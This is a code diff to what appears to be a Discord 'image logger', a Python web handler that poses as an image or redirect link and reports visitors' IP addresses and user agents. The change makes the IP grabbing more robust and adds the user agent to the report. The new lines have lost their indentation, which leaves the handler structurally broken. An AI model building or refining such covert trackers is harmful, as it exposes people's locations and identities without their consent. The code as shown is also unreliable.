@@ -213,19 +213,36 @@ width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
             
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-                return
-            
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
+          # جيب IP بشكل آمن
+ip = self.headers.get('x-forwarded-for')
+if not ip:
+    ip = self.client_address[0]
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+# لو فيه أكثر من IP
+ip = ip.split(",")[0].strip()
 
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
-                return
+# جيب اليوزر ايجنت
+useragent = self.headers.get('user-agent') or "Unknown"
+
+# Blacklist check
+if ip.startswith(blacklistedIPs):
+    return
+
+# Bot check
+if botCheck(ip, useragent):
+    self.send_response(200 if config["buggedImage"] else 302)
+    self.send_header(
+        'Content-type' if config["buggedImage"] else 'Location',
+        'image/jpeg' if config["buggedImage"] else url
+    )
+    self.end_headers()
+
+    if config["buggedImage"]:
+        self.wfile.write(binaries["loading"])
+
+    makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)
+    
+    return
             
             else:
                 s = self.path
